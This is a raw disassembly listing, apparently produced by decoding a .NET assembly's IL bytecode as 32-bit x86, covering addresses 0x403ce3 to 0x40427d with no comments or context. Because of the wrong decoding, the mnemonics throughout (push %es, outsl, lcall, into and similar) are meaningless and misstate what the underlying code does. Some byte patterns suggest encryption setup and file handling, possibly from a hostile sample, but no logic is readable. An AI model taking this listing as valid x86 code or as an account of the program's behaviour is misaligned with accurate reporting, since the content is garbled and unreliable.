  403ce3:	00 70 28             	add    %dh,0x28(%eax)
  403ce6:	43                   	inc    %ebx
  403ce7:	00 00                	add    %al,(%eax)
  403ce9:	06                   	push   %es
  403cea:	de 0c 28             	fimuls (%eax,%ebp,1)
  403ced:	2c 00                	sub    $0x0,%al
  403cef:	00 0a                	add    %cl,(%edx)
  403cf1:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403cf7:	00 2a                	add    %ch,(%edx)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 01                	add    %al,(%ecx)
  403cfd:	10 00                	adc    %al,(%eax)
  403cff:	00 00                	add    %al,(%eax)
  403d01:	00 00                	add    %al,(%eax)
  403d03:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  403d07:	0c 14                	or     $0x14,%al
  403d09:	00 00                	add    %al,(%eax)
  403d0b:	01 2e                	add    %ebp,(%esi)
  403d0d:	73 45                	jae    0x403d54
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	06                   	push   %es
  403d12:	80 2a 00             	subb   $0x0,(%edx)
  403d15:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403d18:	32 03                	xor    (%ebx),%al
  403d1a:	74 0a                	je     0x403d26
  403d1c:	00 00                	add    %al,(%eax)
  403d1e:	1b 28                	sbb    (%eax),%ebp
  403d20:	3c 00                	cmp    $0x0,%al
  403d22:	00 06                	add    %al,(%esi)
  403d24:	2a 1a                	sub    (%edx),%bl
  403d26:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403d2a:	06                   	push   %es
  403d2b:	2a 1b                	sub    (%ebx),%bl
  403d2d:	30 06                	xor    %al,(%esi)
  403d2f:	00 7b 00             	add    %bh,0x0(%ebx)
  403d32:	00 00                	add    %al,(%eax)
  403d34:	15 00 00 11 73       	adc    $0x73110000,%eax
  403d39:	bb 00 00 0a 0b       	mov    $0xb0a0000,%ebx
  403d3e:	73 59                	jae    0x403d99
  403d40:	00 00                	add    %al,(%eax)
  403d42:	0a 0c 1f             	or     (%edi,%ebx,1),%cl
  403d45:	20 8d 2d 00 00 01    	and    %cl,0x100002d(%ebp)
  403d4b:	0d 08 7e 0b 00       	or     $0xb7e08,%eax
  403d50:	00 04 28             	add    %al,(%eax,%ebp,1)
  403d53:	14 00                	adc    $0x0,%al
  403d55:	00 06                	add    %al,(%esi)
  403d57:	6f                   	outsl  %ds:(%esi),(%dx)
  403d58:	5a                   	pop    %edx
  403d59:	00 00                	add    %al,(%eax)
  403d5b:	0a 25 16 09 16 1f    	or     0x1f160916,%ah
  403d61:	10 28                	adc    %ch,(%eax)
  403d63:	bc 00 00 0a 16       	mov    $0x160a0000,%esp
  403d68:	09 1f                	or     %ebx,(%edi)
  403d6a:	0f 1f 10             	nopl   (%eax)
  403d6d:	28 bc 00 00 0a 07 09 	sub    %bh,0x9070a00(%eax,%eax,1)
  403d74:	6f                   	outsl  %ds:(%esi),(%dx)
  403d75:	bd 00 00 0a 07       	mov    $0x70a0000,%ebp
  403d7a:	18 6f be             	sbb    %ch,-0x42(%edi)
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	0a 07                	or     (%edi),%al
  403d81:	6f                   	outsl  %ds:(%esi),(%dx)
  403d82:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  403d87:	28 14 00             	sub    %dl,(%eax,%eax,1)
  403d8a:	00 06                	add    %al,(%esi)
  403d8c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403d8f:	04 16                	add    $0x16,%al
  403d91:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  403d94:	69 6f c0 00 00 0a 28 	imul   $0x280a0000,-0x40(%edi),%ebp
  403d9b:	c1 00 00             	roll   $0x0,(%eax)
  403d9e:	0a 0a                	or     (%edx),%cl
  403da0:	de 0f                	fimuls (%edi)
  403da2:	25 28 2c 00 00       	and    $0x2c28,%eax
  403da7:	0a 13                	or     (%ebx),%dl
  403da9:	05 28 2d 00 00       	add    $0x2d28,%eax
  403dae:	0a de                	or     %dh,%bl
  403db0:	00 06                	add    %al,(%esi)
  403db2:	2a 00                	sub    (%eax),%al
  403db4:	01 10                	add    %edx,(%eax)
  403db6:	00 00                	add    %al,(%eax)
  403db8:	00 00                	add    %al,(%eax)
  403dba:	0c 00                	or     $0x0,%al
  403dbc:	5e                   	pop    %esi
  403dbd:	6a 00                	push   $0x0
  403dbf:	0f 14 00             	unpcklps (%eax),%xmm0
  403dc2:	00 01                	add    %al,(%ecx)
  403dc4:	1b 30                	sbb    (%eax),%esi
  403dc6:	06                   	push   %es
  403dc7:	00 7b 00             	add    %bh,0x0(%ebx)
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	15 00 00 11 73       	adc    $0x73110000,%eax
  403dd1:	bb 00 00 0a 0b       	mov    $0xb0a0000,%ebx
  403dd6:	73 59                	jae    0x403e31
  403dd8:	00 00                	add    %al,(%eax)
  403dda:	0a 0c 1f             	or     (%edi,%ebx,1),%cl
  403ddd:	20 8d 2d 00 00 01    	and    %cl,0x100002d(%ebp)
  403de3:	0d 08 7e 0b 00       	or     $0xb7e08,%eax
  403de8:	00 04 28             	add    %al,(%eax,%ebp,1)
  403deb:	14 00                	adc    $0x0,%al
  403ded:	00 06                	add    %al,(%esi)
  403def:	6f                   	outsl  %ds:(%esi),(%dx)
  403df0:	5a                   	pop    %edx
  403df1:	00 00                	add    %al,(%eax)
  403df3:	0a 25 16 09 16 1f    	or     0x1f160916,%ah
  403df9:	10 28                	adc    %ch,(%eax)
  403dfb:	bc 00 00 0a 16       	mov    $0x160a0000,%esp
  403e00:	09 1f                	or     %ebx,(%edi)
  403e02:	0f 1f 10             	nopl   (%eax)
  403e05:	28 bc 00 00 0a 07 09 	sub    %bh,0x9070a00(%eax,%eax,1)
  403e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e0d:	bd 00 00 0a 07       	mov    $0x70a0000,%ebp
  403e12:	18 6f be             	sbb    %ch,-0x42(%edi)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	0a 07                	or     (%edi),%al
  403e19:	6f                   	outsl  %ds:(%esi),(%dx)
  403e1a:	c2 00 00             	ret    $0x0
  403e1d:	0a 02                	or     (%edx),%al
  403e1f:	28 1e                	sub    %bl,(%esi)
  403e21:	00 00                	add    %al,(%eax)
  403e23:	0a 13                	or     (%ebx),%dl
  403e25:	04 11                	add    $0x11,%al
  403e27:	04 16                	add    $0x16,%al
  403e29:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  403e2c:	69 6f c0 00 00 0a 28 	imul   $0x280a0000,-0x40(%edi),%ebp
  403e33:	15 00 00 06 0a       	adc    $0xa060000,%eax
  403e38:	de 0f                	fimuls (%edi)
  403e3a:	25 28 2c 00 00       	and    $0x2c28,%eax
  403e3f:	0a 13                	or     (%ebx),%dl
  403e41:	05 28 2d 00 00       	add    $0x2d28,%eax
  403e46:	0a de                	or     %dh,%bl
  403e48:	00 06                	add    %al,(%esi)
  403e4a:	2a 00                	sub    (%eax),%al
  403e4c:	01 10                	add    %edx,(%eax)
  403e4e:	00 00                	add    %al,(%eax)
  403e50:	00 00                	add    %al,(%eax)
  403e52:	0c 00                	or     $0x0,%al
  403e54:	5e                   	pop    %esi
  403e55:	6a 00                	push   $0x0
  403e57:	0f 14 00             	unpcklps (%eax),%xmm0
  403e5a:	00 01                	add    %al,(%ecx)
  403e5c:	1b 30                	sbb    (%eax),%esi
  403e5e:	03 00                	add    (%eax),%eax
  403e60:	ad                   	lods   %ds:(%esi),%eax
  403e61:	00 00                	add    %al,(%eax)
  403e63:	00 16                	add    %dl,(%esi)
  403e65:	00 00                	add    %al,(%eax)
  403e67:	11 73 ad             	adc    %esi,-0x53(%ebx)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	0a 0a                	or     (%edx),%cl
  403e6e:	28 c3                	sub    %al,%bl
  403e70:	00 00                	add    %al,(%eax)
  403e72:	0a 7e 19             	or     0x19(%esi),%bh
  403e75:	00 00                	add    %al,(%eax)
  403e77:	04 28                	add    $0x28,%al
  403e79:	c4 00                	les    (%eax),%eax
  403e7b:	00 0a                	add    %cl,(%edx)
  403e7d:	28 26                	sub    %ah,(%esi)
  403e7f:	00 00                	add    %al,(%eax)
  403e81:	0a 0b                	or     (%ebx),%cl
  403e83:	7e 19                	jle    0x403e9e
  403e85:	00 00                	add    %al,(%eax)
  403e87:	04 72                	add    $0x72,%al
  403e89:	7f 00                	jg     0x403e8b
  403e8b:	00 70 16             	add    %dh,0x16(%eax)
  403e8e:	28 56 00             	sub    %dl,0x0(%esi)
  403e91:	00 0a                	add    %cl,(%edx)
  403e93:	2c 56                	sub    $0x56,%al
  403e95:	7e 18                	jle    0x403eaf
  403e97:	00 00                	add    %al,(%eax)
  403e99:	04 2c                	add    $0x2c,%al
  403e9b:	3c 72                	cmp    $0x72,%al
  403e9d:	32 08                	xor    (%eax),%cl
  403e9f:	00 70 28             	add    %dh,0x28(%eax)
  403ea2:	17                   	pop    %ss
  403ea3:	00 00                	add    %al,(%eax)
  403ea5:	06                   	push   %es
  403ea6:	72 a8                	jb     0x403e50
  403ea8:	06                   	push   %es
  403ea9:	00 70 16             	add    %dh,0x16(%eax)
  403eac:	28 56 00             	sub    %dl,0x0(%esi)
  403eaf:	00 0a                	add    %cl,(%edx)
  403eb1:	2c 38                	sub    $0x38,%al
  403eb3:	06                   	push   %es
  403eb4:	7e 19                	jle    0x403ecf
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	04 07                	add    $0x7,%al
  403eba:	6f                   	outsl  %ds:(%esi),(%dx)
  403ebb:	c5 00                	lds    (%eax),%eax
  403ebd:	00 0a                	add    %cl,(%edx)
  403ebf:	07                   	pop    %es
  403ec0:	28 c6                	sub    %al,%dh
  403ec2:	00 00                	add    %al,(%eax)
  403ec4:	0a 26                	or     (%esi),%ah
  403ec6:	72 32                	jb     0x403efa
  403ec8:	08 00                	or     %al,(%eax)
  403eca:	70 72                	jo     0x403f3e
  403ecc:	a8 06                	test   $0x6,%al
  403ece:	00 70 28             	add    %dh,0x28(%eax)
  403ed1:	18 00                	sbb    %al,(%eax)
  403ed3:	00 06                	add    %al,(%esi)
  403ed5:	26 2b 13             	sub    %es:(%ebx),%edx
  403ed8:	06                   	push   %es
  403ed9:	7e 19                	jle    0x403ef4
  403edb:	00 00                	add    %al,(%eax)
  403edd:	04 07                	add    $0x7,%al
  403edf:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee0:	c5 00                	lds    (%eax),%eax
  403ee2:	00 0a                	add    %cl,(%edx)
  403ee4:	07                   	pop    %es
  403ee5:	28 c6                	sub    %al,%dh
  403ee7:	00 00                	add    %al,(%eax)
  403ee9:	0a 26                	or     (%esi),%ah
  403eeb:	00 06                	add    %al,(%esi)
  403eed:	6f                   	outsl  %ds:(%esi),(%dx)
  403eee:	b1 00                	mov    $0x0,%cl
  403ef0:	00 0a                	add    %cl,(%edx)
  403ef2:	14 0a                	adc    $0xa,%al
  403ef4:	de 0e                	fimuls (%esi)
  403ef6:	25 28 2c 00 00       	and    $0x2c28,%eax
  403efb:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  403efe:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  403f03:	00 de                	add    %bl,%dh
  403f05:	0e                   	push   %cs
  403f06:	25 28 2c 00 00       	and    $0x2c28,%eax
  403f0b:	0a 0d 28 2d 00 00    	or     0x2d28,%cl
  403f11:	0a de                	or     %dh,%bl
  403f13:	00 2a                	add    %ch,(%edx)
  403f15:	00 00                	add    %al,(%eax)
  403f17:	00 01                	add    %al,(%ecx)
  403f19:	1c 00                	sbb    $0x0,%al
  403f1b:	00 00                	add    %al,(%eax)
  403f1d:	00 84 00 0a 8e 00 0e 	add    %al,0xe008e0a(%eax,%eax,1)
  403f24:	14 00                	adc    $0x0,%al
  403f26:	00 01                	add    %al,(%ecx)
  403f28:	00 00                	add    %al,(%eax)
  403f2a:	1b 00                	sbb    (%eax),%eax
  403f2c:	83 9e 00 0e 14 00 00 	sbbl   $0x0,0x140e00(%esi)
  403f33:	01 1b                	add    %ebx,(%ebx)
  403f35:	30 0a                	xor    %cl,(%edx)
  403f37:	00 be 00 00 00 17    	add    %bh,0x17000000(%esi)
  403f3d:	00 00                	add    %al,(%eax)
  403f3f:	11 7e 13             	adc    %edi,0x13(%esi)
  403f42:	00 00                	add    %al,(%eax)
  403f44:	04 39                	add    $0x39,%al
  403f46:	a9 00 00 00 28       	test   $0x28000000,%eax
  403f4b:	28 00                	sub    %al,(%eax)
  403f4d:	00 0a                	add    %cl,(%edx)
  403f4f:	7e 16                	jle    0x403f67
  403f51:	00 00                	add    %al,(%eax)
  403f53:	04 16                	add    $0x16,%al
  403f55:	28 c7                	sub    %al,%bh
  403f57:	00 00                	add    %al,(%eax)
  403f59:	0a 39                	or     (%ecx),%bh
  403f5b:	9e                   	sahf
  403f5c:	00 00                	add    %al,(%eax)
  403f5e:	00 28                	add    %ch,(%eax)
  403f60:	50                   	push   %eax
  403f61:	00 00                	add    %al,(%eax)
  403f63:	06                   	push   %es
  403f64:	7e 16                	jle    0x403f7c
  403f66:	00 00                	add    %al,(%eax)
  403f68:	04 28                	add    $0x28,%al
  403f6a:	33 00                	xor    (%eax),%eax
  403f6c:	00 0a                	add    %cl,(%edx)
  403f6e:	28 51 00             	sub    %dl,0x0(%ecx)
  403f71:	00 06                	add    %al,(%esi)
  403f73:	28 2b                	sub    %ch,(%ebx)
  403f75:	00 00                	add    %al,(%eax)
  403f77:	06                   	push   %es
  403f78:	28 52 00             	sub    %dl,0x0(%edx)
  403f7b:	00 06                	add    %al,(%esi)
  403f7d:	7e 0f                	jle    0x403f8e
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	04 2c                	add    $0x2c,%al
  403f83:	10 7e 0f             	adc    %bh,0xf(%esi)
  403f86:	00 00                	add    %al,(%eax)
  403f88:	04 6f                	add    $0x6f,%al
  403f8a:	c8 00 00 0a          	enter  $0x0,$0xa
  403f8e:	14 80                	adc    $0x80,%al
  403f90:	0f 00 00             	sldt   (%eax)
  403f93:	04 28                	add    $0x28,%al
  403f95:	39 00                	cmp    %eax,(%eax)
  403f97:	00 06                	add    %al,(%esi)
  403f99:	14 d0                	adc    $0xd0,%al
  403f9b:	42                   	inc    %edx
  403f9c:	00 00                	add    %al,(%eax)
  403f9e:	01 28                	add    %ebp,(%eax)
  403fa0:	14 00                	adc    $0x0,%al
  403fa2:	00 0a                	add    %cl,(%edx)
  403fa4:	72 3a                	jb     0x403fe0
  403fa6:	08 00                	or     %al,(%eax)
  403fa8:	70 17                	jo     0x403fc1
  403faa:	8d 07                	lea    (%edi),%eax
  403fac:	00 00                	add    %al,(%eax)
  403fae:	01 25 16 7e 16 00    	add    %esp,0x167e16
  403fb4:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403fb7:	25 0a 14 14 17       	and    $0x1714140a,%eax
  403fbc:	8d 22                	lea    (%edx),%esp
  403fbe:	00 00                	add    %al,(%eax)
  403fc0:	01 25 16 17 9c 25    	add    %esp,0x259c1716
  403fc6:	0b 17                	or     (%edi),%edx
  403fc8:	28 c9                	sub    %cl,%cl
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	0a 26                	or     (%esi),%ah
  403fce:	07                   	pop    %es
  403fcf:	16                   	push   %ss
  403fd0:	91                   	xchg   %eax,%ecx
  403fd1:	2c 0d                	sub    $0xd,%al
  403fd3:	06                   	push   %es
  403fd4:	16                   	push   %ss
  403fd5:	9a 28 11 00 00 0a 80 	lcall  $0x800a,$0x1128
  403fdc:	16                   	push   %ss
  403fdd:	00 00                	add    %al,(%eax)
  403fdf:	04 28                	add    $0x28,%al
  403fe1:	2b 00                	sub    (%eax),%eax
  403fe3:	00 0a                	add    %cl,(%edx)
  403fe5:	de 16                	ficoms (%esi)
  403fe7:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  403fea:	00 0a                	add    %cl,(%edx)
  403fec:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403ff2:	0a 28                	or     (%eax),%ch
  403ff4:	28 00                	sub    %al,(%eax)
  403ff6:	00 0a                	add    %cl,(%edx)
  403ff8:	80 16 00             	adcb   $0x0,(%esi)
  403ffb:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403ffe:	00 00                	add    %al,(%eax)
  404000:	01 10                	add    %edx,(%eax)
  404002:	00 00                	add    %al,(%eax)
  404004:	00 00                	add    %al,(%eax)
  404006:	1f                   	pop    %ds
  404007:	00 88 a7 00 0c 14    	add    %cl,0x140c00a7(%eax)
  40400d:	00 00                	add    %al,(%eax)
  40400f:	01 0b                	add    %ecx,(%ebx)
  404011:	30 03                	xor    %al,(%ebx)
  404013:	00 70 00             	add    %dh,0x0(%eax)
  404016:	00 00                	add    %al,(%eax)
  404018:	00 00                	add    %al,(%eax)
  40401a:	00 00                	add    %al,(%eax)
  40401c:	7e 14                	jle    0x404032
  40401e:	00 00                	add    %al,(%eax)
  404020:	04 28                	add    $0x28,%al
  404022:	7a 00                	jp     0x404024
  404024:	00 0a                	add    %cl,(%edx)
  404026:	72 c2                	jb     0x403fea
  404028:	06                   	push   %es
  404029:	00 70 7e             	add    %dh,0x7e(%eax)
  40402c:	15 00 00 04 28       	adc    $0x28040000,%eax
  404031:	51                   	push   %ecx
  404032:	00 00                	add    %al,(%eax)
  404034:	0a 28                	or     (%eax),%ch
  404036:	ca 00 00             	lret   $0x0
  404039:	0a 2d 21 7e 14 00    	or     0x147e21,%ch
  40403f:	00 04 28             	add    %al,(%eax,%ebp,1)
  404042:	7a 00                	jp     0x404044
  404044:	00 0a                	add    %cl,(%edx)
  404046:	72 c2                	jb     0x40400a
  404048:	06                   	push   %es
  404049:	00 70 7e             	add    %dh,0x7e(%eax)
  40404c:	15 00 00 04 28       	adc    $0x28040000,%eax
  404051:	51                   	push   %ecx
  404052:	00 00                	add    %al,(%eax)
  404054:	0a 28                	or     (%eax),%ch
  404056:	cb                   	lret
  404057:	00 00                	add    %al,(%eax)
  404059:	0a 26                	or     (%esi),%ah
  40405b:	2b 20                	sub    (%eax),%esp
  40405d:	7e 16                	jle    0x404075
  40405f:	00 00                	add    %al,(%eax)
  404061:	04 28                	add    $0x28,%al
  404063:	33 00                	xor    (%eax),%eax
  404065:	00 0a                	add    %cl,(%edx)
  404067:	28 27                	sub    %ah,(%edi)
  404069:	00 00                	add    %al,(%eax)
  40406b:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  40406e:	7e 16                	jle    0x404086
  404070:	00 00                	add    %al,(%eax)
  404072:	04 28                	add    $0x28,%al
  404074:	33 00                	xor    (%eax),%eax
  404076:	00 0a                	add    %cl,(%edx)
  404078:	28 cc                	sub    %cl,%ah
  40407a:	00 00                	add    %al,(%eax)
  40407c:	0a de                	or     %dh,%bl
  40407e:	0c 28                	or     $0x28,%al
  404080:	2c 00                	sub    $0x0,%al
  404082:	00 0a                	add    %cl,(%edx)
  404084:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40408a:	00 2a                	add    %ch,(%edx)
  40408c:	01 10                	add    %edx,(%eax)
  40408e:	00 00                	add    %al,(%eax)
  404090:	00 00                	add    %al,(%eax)
  404092:	00 00                	add    %al,(%eax)
  404094:	63 63 00             	arpl   %esp,0x0(%ebx)
  404097:	0c 14                	or     $0x14,%al
  404099:	00 00                	add    %al,(%eax)
  40409b:	01 1b                	add    %ebx,(%ebx)
  40409d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4040a0:	b2 00                	mov    $0x0,%dl
  4040a2:	00 00                	add    %al,(%eax)
  4040a4:	18 00                	sbb    %al,(%eax)
  4040a6:	00 11                	add    %dl,(%ecx)
  4040a8:	28 28                	sub    %ch,(%eax)
  4040aa:	00 00                	add    %al,(%eax)
  4040ac:	0a 19                	or     (%ecx),%bl
  4040ae:	17                   	pop    %ss
  4040af:	73 cd                	jae    0x40407e
  4040b1:	00 00                	add    %al,(%eax)
  4040b3:	0a 0a                	or     (%edx),%cl
  4040b5:	06                   	push   %es
  4040b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4040b7:	ce                   	into
  4040b8:	00 00                	add    %al,(%eax)
  4040ba:	0a 17                	or     (%edi),%dl
  4040bc:	6a da                	push   $0xffffffda
  4040be:	b7 17                	mov    $0x17,%bh
  4040c0:	d6                   	salc
  4040c1:	8d 2d 00 00 01 0b    	lea    0xb010000,%ebp
  4040c7:	06                   	push   %es
  4040c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4040c9:	ce                   	into
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	0a b7 0c 16 0d 2b    	or     0x2b0d160c(%edi),%dh
  4040d2:	19 06                	sbb    %eax,(%esi)
  4040d4:	07                   	pop    %es
  4040d5:	09 08                	or     %ecx,(%eax)
  4040d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d8:	cf                   	iret
  4040d9:	00 00                	add    %al,(%eax)
  4040db:	0a 13                	or     (%ebx),%dl
  4040dd:	04 11                	add    $0x11,%al
  4040df:	04 2c                	add    $0x2c,%al
  4040e1:	0e                   	push   %cs
  4040e2:	09 11                	or     %edx,(%ecx)
  4040e4:	04 d6                	add    $0xd6,%al
  4040e6:	0d 08 11 04 da       	or     $0xda041108,%eax
  4040eb:	0c 08                	or     $0x8,%al
  4040ed:	16                   	push   %ss
  4040ee:	30 e3                	xor    %ah,%bl
  4040f0:	07                   	pop    %es
  4040f1:	8e 69 0c             	mov    0xc(%ecx),%gs
  4040f4:	02 18                	add    (%eax),%bl
  4040f6:	18 73 cd             	sbb    %dh,-0x33(%ebx)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 13                	or     (%ebx),%dl
  4040fd:	05 11 05 07 16       	add    $0x16070511,%eax
  404102:	08 6f d0             	or     %ch,-0x30(%edi)
  404105:	00 00                	add    %al,(%eax)
  404107:	0a 11                	or     (%ecx),%dl
  404109:	05 6f d1 00 00       	add    $0xd16f,%eax
  40410e:	0a 11                	or     (%ecx),%dl
  404110:	05 6f d2 00 00       	add    $0xd26f,%eax
  404115:	0a de                	or     %dh,%bl
  404117:	0c 11                	or     $0x11,%al
  404119:	05 2c 07 11 05       	add    $0x511072c,%eax
  40411e:	6f                   	outsl  %ds:(%esi),(%dx)
  40411f:	44                   	inc    %esp
  404120:	00 00                	add    %al,(%eax)
  404122:	0a dc                	or     %ah,%bl
  404124:	06                   	push   %es
  404125:	6f                   	outsl  %ds:(%esi),(%dx)
  404126:	d1 00                	roll   $1,(%eax)
  404128:	00 0a                	add    %cl,(%edx)
  40412a:	06                   	push   %es
  40412b:	6f                   	outsl  %ds:(%esi),(%dx)
  40412c:	d2 00                	rolb   %cl,(%eax)
  40412e:	00 0a                	add    %cl,(%edx)
  404130:	de 0a                	fimuls (%edx)
  404132:	06                   	push   %es
  404133:	2c 06                	sub    $0x6,%al
  404135:	06                   	push   %es
  404136:	6f                   	outsl  %ds:(%esi),(%dx)
  404137:	44                   	inc    %esp
  404138:	00 00                	add    %al,(%eax)
  40413a:	0a dc                	or     %ah,%bl
  40413c:	7e 16                	jle    0x404154
  40413e:	00 00                	add    %al,(%eax)
  404140:	04 28                	add    $0x28,%al
  404142:	33 00                	xor    (%eax),%eax
  404144:	00 0a                	add    %cl,(%edx)
  404146:	28 1d 00 00 06 de    	sub    %bl,0xde060000
  40414c:	0c 28                	or     $0x28,%al
  40414e:	2c 00                	sub    $0x0,%al
  404150:	00 0a                	add    %cl,(%edx)
  404152:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404158:	00 2a                	add    %ch,(%edx)
  40415a:	00 00                	add    %al,(%eax)
  40415c:	01 28                	add    %ebp,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	56                   	push   %esi
  404163:	00 1a                	add    %bl,(%edx)
  404165:	70 00                	jo     0x404167
  404167:	0c 00                	or     $0x0,%al
  404169:	00 00                	add    %al,(%eax)
  40416b:	00 02                	add    %al,(%edx)
  40416d:	00 0d 00 7d 8a 00    	add    %cl,0x8a7d00
  404173:	0a 00                	or     (%eax),%al
  404175:	00 00                	add    %al,(%eax)
  404177:	00 00                	add    %al,(%eax)
  404179:	00 00                	add    %al,(%eax)
  40417b:	00 a5 a5 00 0c 14    	add    %ah,0x140c00a5(%ebp)
  404181:	00 00                	add    %al,(%eax)
  404183:	01 0b                	add    %ecx,(%ebx)
  404185:	30 04 00             	xor    %al,(%eax,%eax,1)
  404188:	5e                   	pop    %esi
  404189:	00 00                	add    %al,(%eax)
  40418b:	00 00                	add    %al,(%eax)
  40418d:	00 00                	add    %al,(%eax)
  40418f:	00 02                	add    %al,(%edx)
  404191:	2c 29                	sub    $0x29,%al
  404193:	72 46                	jb     0x4041db
  404195:	08 00                	or     %al,(%eax)
  404197:	70 7e                	jo     0x404217
  404199:	16                   	push   %ss
  40419a:	00 00                	add    %al,(%eax)
  40419c:	04 28                	add    $0x28,%al
  40419e:	49                   	dec    %ecx
  40419f:	00 00                	add    %al,(%eax)
  4041a1:	0a 72 d1             	or     -0x2f(%edx),%dh
  4041a4:	08 00                	or     %al,(%eax)
  4041a6:	70 28                	jo     0x4041d0
  4041a8:	49                   	dec    %ecx
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	0a 28                	or     (%eax),%ch
  4041ad:	33 00                	xor    (%eax),%eax
  4041af:	00 0a                	add    %cl,(%edx)
  4041b1:	16                   	push   %ss
  4041b2:	16                   	push   %ss
  4041b3:	15 28 2a 00 00       	adc    $0x2a28,%eax
  4041b8:	0a 26                	or     (%esi),%ah
  4041ba:	2b 23                	sub    (%ebx),%esp
  4041bc:	7e 31                	jle    0x4041ef
  4041be:	00 00                	add    %al,(%eax)
  4041c0:	0a 72 d7             	or     -0x29(%edx),%dh
  4041c3:	08 00                	or     %al,(%eax)
  4041c5:	70 6f                	jo     0x404236
  4041c7:	1f                   	pop    %ds
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	0a 7e 0e             	or     0xe(%esi),%bh
  4041cd:	00 00                	add    %al,(%eax)
  4041cf:	04 7e                	add    $0x7e,%al
  4041d1:	16                   	push   %ss
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	04 28                	add    $0x28,%al
  4041d6:	11 00                	adc    %eax,(%eax)
  4041d8:	00 0a                	add    %cl,(%edx)
  4041da:	6f                   	outsl  %ds:(%esi),(%dx)
  4041db:	34 00                	xor    $0x0,%al
  4041dd:	00 0a                	add    %cl,(%edx)
  4041df:	de 0c 28             	fimuls (%eax,%ebp,1)
  4041e2:	2c 00                	sub    $0x0,%al
  4041e4:	00 0a                	add    %cl,(%edx)
  4041e6:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4041ec:	00 2a                	add    %ch,(%edx)
  4041ee:	00 00                	add    %al,(%eax)
  4041f0:	01 10                	add    %edx,(%eax)
  4041f2:	00 00                	add    %al,(%eax)
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	51                   	push   %ecx
  4041f9:	51                   	push   %ecx
  4041fa:	00 0c 14             	add    %cl,(%esp,%edx,1)
  4041fd:	00 00                	add    %al,(%eax)
  4041ff:	01 2e                	add    %ebp,(%esi)
  404201:	7e 0d                	jle    0x404210
  404203:	00 00                	add    %al,(%eax)
  404205:	04 80                	add    $0x80,%al
  404207:	2d 00 00 04 2a       	sub    $0x2a040000,%eax
  40420c:	1b 30                	sbb    (%eax),%esi
  40420e:	03 00                	add    (%eax),%eax
  404210:	06                   	push   %es
  404211:	01 00                	add    %eax,(%eax)
  404213:	00 19                	add    %bl,(%ecx)
  404215:	00 00                	add    %al,(%eax)
  404217:	11 7e 1a             	adc    %edi,0x1a(%esi)
  40421a:	00 00                	add    %al,(%eax)
  40421c:	04 0a                	add    $0xa,%al
  40421e:	2b 0e                	sub    (%esi),%ecx
  404220:	20 e8                	and    %ch,%al
  404222:	03 00                	add    (%eax),%eax
  404224:	00 28                	add    %ch,(%eax)
  404226:	77 00                	ja     0x404228
  404228:	00 0a                	add    %cl,(%edx)
  40422a:	06                   	push   %es
  40422b:	17                   	pop    %ss
  40422c:	da 0a                	fimull (%edx)
  40422e:	06                   	push   %es
  40422f:	2d ef 16 0b 17       	sub    $0x170b16ef,%eax
  404234:	28 25 00 00 06 12    	sub    %ah,0x12060000
  40423a:	01 73 d3             	add    %esi,-0x2d(%ebx)
  40423d:	00 00                	add    %al,(%eax)
  40423f:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  404245:	07                   	pop    %es
  404246:	2d 05 28 2b 00       	sub    $0x2b2805,%eax
  40424b:	00 0a                	add    %cl,(%edx)
  40424d:	7e 12                	jle    0x404261
  40424f:	00 00                	add    %al,(%eax)
  404251:	04 2c                	add    $0x2c,%al
  404253:	05 28 13 00 00       	add    $0x1328,%eax
  404258:	06                   	push   %es
  404259:	28 4f 00             	sub    %cl,0x0(%edi)
  40425c:	00 06                	add    %al,(%esi)
  40425e:	7e 20                	jle    0x404280
  404260:	00 00                	add    %al,(%eax)
  404262:	04 6f                	add    $0x6f,%al
  404264:	d4 00                	aam    $0x0
  404266:	00 0a                	add    %cl,(%edx)
  404268:	7e 10                	jle    0x40427a
  40426a:	00 00                	add    %al,(%eax)
  40426c:	04 2c                	add    $0x2c,%al
  40426e:	16                   	push   %ss
  40426f:	14 fe                	adc    $0xfe,%al
  404271:	06                   	push   %es
  404272:	58                   	pop    %eax
  404273:	00 00                	add    %al,(%eax)
  404275:	06                   	push   %es
  404276:	73 99                	jae    0x404211
  404278:	00 00                	add    %al,(%eax)
  40427a:	0a 73 9a             	or     -0x66(%ebx),%dh
  40427d:	00 00                	add    %al,(%eax)
